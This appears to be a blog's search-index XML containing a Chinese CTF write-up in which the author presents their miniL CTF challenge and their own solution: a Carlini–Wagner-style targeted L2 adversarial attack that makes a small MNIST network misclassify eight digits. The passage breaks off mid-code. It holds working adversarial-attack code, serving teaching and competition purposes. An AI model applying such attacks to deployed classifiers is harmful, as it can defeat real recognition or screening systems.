<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pinned</title>
      <link href="2077/07/07/Pinned/"/>
      <url>2077/07/07/Pinned/</url>
      
        <content type="html"><![CDATA[<p>🕊 <code>NO PENGUINS</code> 🕊</p><span id="more"></span><ul><li>Game<ul><li>UE5</li></ul></li><li>AI<ul><li><a href="https://distill.pub/2020/growing-ca/">神经细胞自动机</a></li><li>CNN</li></ul></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>L2 Targeted Attack</title>
      <link href="2022/04/09/L2_Targeted_Attack/"/>
      <url>2022/04/09/L2_Targeted_Attack/</url>
      
        <content type="html"><![CDATA[<p>终于是把这玩意儿自己实现了一遍，恰逢miniL CTF，这文章虽然是22.04.09写的，但是估计博客得等到五月多才会更新，届时将也再补充一些在miniL CTF中本题的情况</p><span id="more"></span><!--toc--><h1 id="L2-Targeted-Attack"><a href="#L2-Targeted-Attack" class="headerlink" title="L2 Targeted Attack"></a>L2 Targeted Attack</h1><p><strong>前置知识：<a href="https://kyriota.com/2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C[%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8]/">全连接神经网络</a></strong></p><p><strong>参考文献：<a href="https://arxiv.org/abs/1608.04644">Towards Evaluating the Robustness</a></strong></p><blockquote><p>碎碎念：这段时间又在捣鼓<a href="https://kyriota.com/2021/11/17/Uncertainty/">Uncertainty</a>，加点内容想去参加吉比特的Jam，等Jam完了可能的研究对象应该是CNN，UE5之类的（神经细胞自动机暂时就先鸽了，但确实很有趣，以后应该回去看看的</p></blockquote><h2 id="miniL-CTF"><a href="#miniL-CTF" class="headerlink" title="miniL CTF"></a>miniL CTF</h2><p>有幸在校内的miniL CTF出一次题（一个L2TargetedAttack，一个CheatEngine改坐标），本来想做一个CNN的L2 Targeted Attack，这样可以把情景包装得有趣一些，但是还是太懒了，弄完这个就不想弄CNN了，就先出到这里了</p><p>题目名为<code>NEXT</code>，顾名思义就是让你对MNIST中的几个Samples加扰动，使得如下的8个Samples被模型识别成其原本lable的下一个数，如1→2，2→3…</p><p>为了让题目有个情景，所以把原本的weight给轮了一下顺序，原lable本应是[0,1,2,3,4,5,6,7,8,9]，被改成了[1,2,3,4,5,6,7,8,9,0]，于是乎题目就有了一个虽然不合理但可以忽悠人的情景</p><img src="/images/L2TarAtt_Original.png"><p>模型为带DropOut的FCNN，虽然带DropOut，但是整体梯度比较明显，对扰动的鲁棒性欠佳，很适合作为攻击对象</p><p>源码上对原本的函数做了一点混淆，比如<code>softMax</code>缩写成<code>SM</code>之类的，主要是为了选手深入了解神经网络之后再入手题目，不要底层没摸清楚做纯纯的TFboy</p><p>限制了L2和Linf的大小，是为了让做题人明确这是一个L2 Attack</p><p>task中不包含<code>torch</code>，<code>TF</code>之类的，但可以把weight手动导入一下，然后使用如<code>tf.gradientTape</code>之类的方法自动求梯度，我自己解是用比较土的手搓<code>BackProp</code></p><p><a href="https://kyriota.com/html/DLfiles/NEXT_ALL.zip">下载题目及exp</a></p><p>以下是题目代码</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        task.py    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">L2CONSTRAIN = <span class="number">5.6789</span></span><br><span class="line">LINFCONSTRAIN = <span class="number">1.234</span></span><br><span class="line">CONFIDENCE = <span class="number">0.8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RL</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SM</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.array(np.exp(x) / np.<span class="built_in">sum</span>(np.exp(x), axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AB</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = np.matrix(x)</span><br><span class="line">    <span class="keyword">return</span> np.c_[np.ones((x.shape[<span class="number">0</span>], <span class="number">1</span>)), x]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ANN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, uNum</span>):</span></span><br><span class="line">        self.uNum = uNum</span><br><span class="line">        self.lNum = <span class="built_in">len</span>(uNum)</span><br><span class="line">        self.w = [<span class="number">0</span>]</span><br><span class="line">        self.Z = [<span class="number">0</span>]</span><br><span class="line">        self.A = [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FP</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.lNum - <span class="number">1</span>):</span><br><span class="line">            self.Z.append(AB(self.A[-<span class="number">1</span>]) * self.w[i])</span><br><span class="line">            self.A.append(RL(self.Z[-<span class="number">1</span>]))</span><br><span class="line">        self.Z.append(AB(self.A[-<span class="number">1</span>]) * self.w[-<span class="number">1</span>])</span><br><span class="line">        self.A.append(SM(self.Z[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PRED</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        self.Z[<span class="number">0</span>] = np.matrix(x)</span><br><span class="line">        self.A[<span class="number">0</span>] = np.matrix(x)</span><br><span class="line">        self.FP()</span><br><span class="line">        <span class="keyword">return</span> np.array(self.A[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LOAD</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(fileName, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        wt = np.frombuffer(f.read(), np.float64)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.uNum)):</span><br><span class="line">            data = wt[: (self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.uNum[i]]</span><br><span class="line">            shape = (self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>, self.uNum[i])</span><br><span class="line">            self.w.append(np.matrix(data).reshape(shape))</span><br><span class="line">            wt = wt[(self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.uNum[i]:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CHECK</span>(<span class="params">mask: np.matrix, myNN: ANN, x</span>):</span></span><br><span class="line">    l2 = np.<span class="built_in">sum</span>(np.linalg.norm(np.array(mask), axis=<span class="number">1</span>)) / <span class="number">8</span></span><br><span class="line">    linf = np.<span class="built_in">max</span>(np.linalg.norm(np.array(mask), <span class="built_in">ord</span>=np.inf, axis=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> l2 &gt; L2CONSTRAIN:</span><br><span class="line">        print(<span class="string">&quot;Huge L2 &quot;</span> + <span class="built_in">str</span>(l2))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> linf &gt; LINFCONSTRAIN:</span><br><span class="line">        print(<span class="string">&quot;Huge Linf&quot;</span> + <span class="built_in">str</span>(linf))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    res = myNN.PRED(x + mask)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        lable = np.argmax(res[i])</span><br><span class="line">        <span class="keyword">if</span> lable != i + <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">&quot;Wrong Lable &quot;</span> + <span class="built_in">str</span>(lable) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> res[i][lable] &lt; CONFIDENCE:</span><br><span class="line">            print(<span class="string">&quot;Unconfident &quot;</span> + <span class="built_in">str</span>(lable) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(res[i][lable]))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uNum = [<span class="number">784</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">    myNN = ANN(uNum)</span><br><span class="line">    myNN.LOAD(<span class="string">&quot;weight.dat&quot;</span>)</span><br><span class="line">    data = pd.read_csv(<span class="string">r&#x27;picData.csv&#x27;</span>)</span><br><span class="line">    x = np.matrix(data.iloc[:, <span class="number">1</span>:])</span><br><span class="line">    mask = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        print(<span class="string">&quot;&gt;&gt; Mask &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot; :&quot;</span>)</span><br><span class="line">        maskTemp = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">784</span>):</span><br><span class="line">            maskTemp.append(<span class="built_in">float</span>(<span class="built_in">input</span>()))</span><br><span class="line">        mask.append(np.array(maskTemp, dtype=np.float64).ravel())</span><br><span class="line">    mask = np.matrix(mask)</span><br><span class="line">    CHECK(mask, myNN, x)</span><br></pre></td></tr></table></figure>    </div></div><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="Loss"><a href="#Loss" class="headerlink" title="Loss"></a>Loss</h3><p>参考论文，在<code>Loss</code>中包含了对L2的惩罚项，我implement的时候使用的是类似于参数正则化一样的方法，简单但有效，在每次迭代后：根据对L2的限制，让最终的噪声<code>Pert</code>自减一点点</p><p>而对于如何在<code>Loss</code>中体现出逼近Target，直接借鉴一下Carlini大神的结论，即参考文献中的<code>f6</code>，毕竟这些东西就是凭经验凭感觉弄出来的，他们基本也就是选了一些自己觉得有可能可行的<code>Loss</code>然后全部跑一遍，找一个效果最好的</p><img src="/images/L2TarAtt_f6.png" width=350><p>其中加号上标表示对括号内的参数<code>x</code>执行<code>max(x, 0)</code></p><p>大概意会一下，首先这玩意儿得从<code>logits</code>层开始回归，然后至于他这个<code>Loss</code>的思想也就字面意思：打压当前概率最高的，进而扶持target的概率（劫富济贫属于是</p><p>我没有完全按照他的<code>loss</code>来（主要是为了方便），但是思想都是一样的，我implement的就是一个对无关项置零的交叉熵，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_crossEntPert</span>(<span class="params">self</span>):</span></span><br><span class="line">    mat = np.matrix(self.A[-<span class="number">1</span>] - self.y)</span><br><span class="line">    <span class="keyword">if</span> np.argmax(np.array(self.y).ravel()) != np.argmax(np.array(self.A[-<span class="number">1</span>]).ravel()):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> i != np.argmax(np.array(self.y).ravel()) <span class="keyword">and</span> i != np.argmax(np.array(self.A[-<span class="number">1</span>]).ravel()):</span><br><span class="line">                mat[<span class="number">0</span>, i] = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> mat</span><br></pre></td></tr></table></figure><p>注1：此处的<code>Loss</code>还并非最终形态，因为没有加入对<code>Pert</code>的惩罚项</p><p>注2：关于为什么要在最终label是target的情况下直接return，则是因为这样在已经找到属于target的决策区域后的下降速度更快，还可以防止梯度消失</p><h3 id="Get-Gradient"><a href="#Get-Gradient" class="headerlink" title="Get Gradient"></a>Get Gradient</h3><p>由于是自己搓的FCNN，获取梯度直接<code>backProp</code>就行了，比如想要倒数第二层的dZ，<code>backProp</code>之后就直接<code>FCNN.dZ[-2]</code>，非常方便，这个手搓<code>BP</code>的梯度也拿去和<code>tensorflow</code>中的<code>gradientTape</code>求出的梯度做了对比，保证梯度正确</p><p>简化剔除了一些常规<code>BP</code>在此情境下不需要的内容，得到以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backProp</span>(<span class="params">self, d_lossFunc</span>):</span></span><br><span class="line">    self.dZ[-<span class="number">1</span>] = d_lossFunc()</span><br><span class="line">    dw = self.A[-<span class="number">2</span>].T * self.dZ[-<span class="number">1</span>]</span><br><span class="line">    db = np.<span class="built_in">sum</span>(self.dZ[-<span class="number">1</span>], axis=<span class="number">0</span>)</span><br><span class="line">    self.dw[-<span class="number">1</span>] = np.r_[db, dw]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>)):</span><br><span class="line">        self.dA[i] = RemoveBias(self.dZ[i + <span class="number">1</span>] * self.w[i + <span class="number">1</span>].T)</span><br><span class="line">        self.dZ[i] = np.multiply(d_relu(self.Z[i]), self.dA[i])</span><br><span class="line">        dw = self.A[i - <span class="number">1</span>].T * self.dZ[i]</span><br><span class="line">        db = np.<span class="built_in">sum</span>(self.dZ[i], axis=<span class="number">0</span>)</span><br><span class="line">        self.dw[i] = np.r_[db, dw]</span><br><span class="line">self.dA[<span class="number">0</span>] = RemoveBias(self.dZ[<span class="number">1</span>] * self.w[<span class="number">1</span>].T)</span><br><span class="line">self.dZ[<span class="number">0</span>] = self.dA[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="Fool"><a href="#Fool" class="headerlink" title="Fool"></a>Fool</h3><p>现在关键成分都已经齐全了，就可以开始生成AdversarialPerturbation了</p><p>基本的迭代过程大致如下：</p><ul><li>把target设置成<code>y</code>，因为<code>loss</code>函数中会用到（比如要把<code>6</code>糊弄成<code>7</code>，则<code>target=7</code>）</li><li>ForwardProp()</li><li>判断target的confidence是否符合要求，符合则return，不符合则继续</li><li>BackProp()</li><li>对梯度加入关于<code>Pert</code>的惩罚项</li></ul><p>在此基础上，还进行了几点优化：</p><ul><li>因为这个方法肉眼可见的容易出现惩罚项与逼近Target的方向相反的情况，所以加入了一个在Stuck时进行随机扰动的功能</li><li>对起点进行比较小的随机扰动，稍微差异化每次下降过程</li></ul><p>（在输出中加emoji主要是为了快速浏览运行结果，而且事实证明Jupyter对此支持是没问题的，看着很酥糊</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, myNetwork</span>):</span></span><br><span class="line">        self.Network = myNetwork</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetGrad</span>(<span class="params">self, X</span>):</span></span><br><span class="line">        pred = self.Network.predict(X)</span><br><span class="line">        self.Network.backProp(self.Network.d_crossEntPert)</span><br><span class="line">        <span class="keyword">return</span> self.Network.dA[<span class="number">0</span>], pred.ravel()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Fool</span>(<span class="params">self, X, y, tar, foolRate=<span class="number">0.5</span>, maxIter=<span class="number">500</span>, step=<span class="number">0.05</span>, minGrad=<span class="number">0.05</span>, maxGrad=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             constrain=<span class="number">10</span>, stuckRandL2=<span class="number">1</span>, initRandL2=<span class="number">1</span></span>):</span></span><br><span class="line">        rand = np.matrix(np.random.randn(<span class="number">1</span>, <span class="number">784</span>))</span><br><span class="line">        pert = np.zeros((<span class="number">1</span>, <span class="number">784</span>)) + initRandL2 * rand / np.linalg.norm(rand)</span><br><span class="line">        loss = []</span><br><span class="line">        L2Rec = []</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        stuckCnt = <span class="number">0</span></span><br><span class="line">        stuckJudgeCnt = <span class="number">0</span></span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        self.Network.predict(X + pert)</span><br><span class="line">        print(<span class="string">&quot;init: &quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot; prob: &quot;</span> +</span><br><span class="line">              <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[y]))</span><br><span class="line">        self.Network.y = OneHot(</span><br><span class="line">            <span class="number">1</span>, self.Network.unitNum[-<span class="number">1</span>], y) <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> OneHot(<span class="number">1</span>, self.Network.unitNum[-<span class="number">1</span>], tar)</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            print(<span class="string">&quot;\rcnt: &quot;</span> + <span class="built_in">str</span>(cnt) + <span class="string">&quot;  stuck: &quot;</span> + <span class="built_in">str</span>(stuckCnt), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            grad, pred = self.GetGrad(X + pert)</span><br><span class="line">            loss.append(np.linalg.norm(self.Network.A[-<span class="number">1</span>]) <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span></span><br><span class="line">                        -np.<span class="built_in">sum</span>(np.array(self.Network.y) * np.log(self.Network.A[-<span class="number">1</span>])</span><br><span class="line">                        + np.array(<span class="number">1</span> - self.Network.y) * np.log(<span class="number">1</span> - self.Network.A[-<span class="number">1</span>])))</span><br><span class="line">            <span class="keyword">if</span> ((self.Network.A[-<span class="number">1</span>].ravel()[y] &lt; foolRate <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> self.Network.A[-<span class="number">1</span>].ravel()[tar] &gt; foolRate)</span><br><span class="line">                    <span class="keyword">and</span> stuckJudgeCnt &gt; <span class="number">5</span>):</span><br><span class="line">                print(<span class="string">&quot;\n⭕ OK:      &quot;</span> + <span class="built_in">str</span>(np.argmax(pred)) + <span class="string">&quot;    &quot;</span> +</span><br><span class="line">                      <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[np.argmax(pred)]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> np.linalg.norm(pert):</span><br><span class="line">                para = <span class="built_in">max</span>((np.linalg.norm(pert) - constrain) ** <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">                grad -= np.<span class="built_in">sum</span>(np.array(pert) * np.array(grad)) * \</span><br><span class="line">                    (pert / np.linalg.norm(pert)) * para</span><br><span class="line">            L2 = np.linalg.norm(grad)</span><br><span class="line">            L2Rec.append(np.array(L2).ravel())</span><br><span class="line">            <span class="keyword">if</span> L2 &gt; maxGrad:</span><br><span class="line">                grad *= maxGrad / L2</span><br><span class="line">            <span class="keyword">if</span> L2 &lt; minGrad:</span><br><span class="line">                <span class="keyword">if</span> L2 == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;\nERR: grad is zero&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                grad *= minGrad / L2</span><br><span class="line">            pert -= grad * step</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cnt == maxIter - <span class="number">1</span>:</span><br><span class="line">                print(<span class="string">&quot;\n❌ nope:   &quot;</span> + <span class="built_in">str</span>(y <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> tar) + <span class="string">&quot;      &quot;</span> +</span><br><span class="line">                      <span class="built_in">str</span>(self.Network.A[-<span class="number">1</span>].ravel()[y <span class="keyword">if</span> tar == -<span class="number">1</span> <span class="keyword">else</span> tar]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> cnt &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">abs</span>(loss[-<span class="number">1</span>] - loss[-<span class="number">2</span>]) &lt; <span class="number">0.1</span>:</span><br><span class="line">                stuckJudgeCnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> stuckJudgeCnt &gt; <span class="number">10</span>:</span><br><span class="line">                    rand = np.matrix(np.random.randn(</span><br><span class="line">                        pert.shape[<span class="number">0</span>], pert.shape[<span class="number">1</span>]))</span><br><span class="line">                    pert += rand / np.linalg.norm(rand) * stuckRandL2</span><br><span class="line">                    stuckJudgeCnt = <span class="number">0</span></span><br><span class="line">                    stuckCnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> success, pert, loss, L2Rec</span><br></pre></td></tr></table></figure><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>于是我们只需要基于以上的基础再对每个数字计算一遍即可</p><p>考虑到要使得L2尽可能小，我使用动态的Constrain，使得搜索结果的L2快速减小到一个可观的范围</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> KyNetExp</span><br><span class="line">X = np.matrix(pd.read_csv(<span class="string">r&#x27;picData.csv&#x27;</span>).iloc[:, <span class="number">1</span>:])</span><br><span class="line">unitNum = [<span class="number">784</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">FCNN = KyNetExp.Network()</span><br><span class="line">FCNN.Init(unitNum)</span><br><span class="line">FCNN.LoadParameters(<span class="string">&quot;weight.dat&quot;</span>)</span><br><span class="line">Fool = KyNetExp.Fool(FCNN)</span><br><span class="line">pert = []</span><br><span class="line">deltaConstrain = <span class="number">0.1</span></span><br><span class="line">maxUnsuccessCnt = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    print(<span class="string">&quot;\n-------------------- &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot; --------------------\n&quot;</span>)</span><br><span class="line">    bestPert = np.matrix(np.ones((<span class="number">1</span>,<span class="number">784</span>)) * np.inf)</span><br><span class="line">    constrain = <span class="number">30</span></span><br><span class="line">    UnsuccessCnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(UnsuccessCnt &lt; maxUnsuccessCnt):</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        success, pert_i, loss, L2Rec = Fool.Fool(X[i], i+<span class="number">1</span>, i+<span class="number">2</span>, maxIter=<span class="number">500</span>, foolRate=<span class="number">0.8</span>,</span><br><span class="line">                                                 constrain=constrain, stuckRandL2=<span class="number">1</span>, initRandL2=<span class="number">1</span>,</span><br><span class="line">                                                 minGrad=<span class="number">0.001</span>)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="keyword">if</span> np.linalg.norm(pert_i) &lt; np.linalg.norm(bestPert):</span><br><span class="line">                constrain = <span class="built_in">min</span>(np.linalg.norm(pert_i) - deltaConstrain, constrain)</span><br><span class="line">                bestPert = pert_i</span><br><span class="line">                UnsuccessCnt = <span class="number">0</span></span><br><span class="line">                print(<span class="string">&quot;----------------------------------&quot;</span>)</span><br><span class="line">                print(<span class="string">&quot;# New Constrain: &quot;</span> + <span class="built_in">str</span>(constrain))</span><br><span class="line">                print(<span class="string">&quot;----------------------------------\n&quot;</span>)</span><br><span class="line">            constrain -= deltaConstrain / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            UnsuccessCnt += <span class="number">1</span></span><br><span class="line">    pert.append(bestPert)</span><br></pre></td></tr></table></figure><p>最终生成的Pert数据如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># L2</span></span><br><span class="line">np.linalg.norm(np.array([np.array(i).ravel() <span class="keyword">for</span> i <span class="keyword">in</span> pert]), 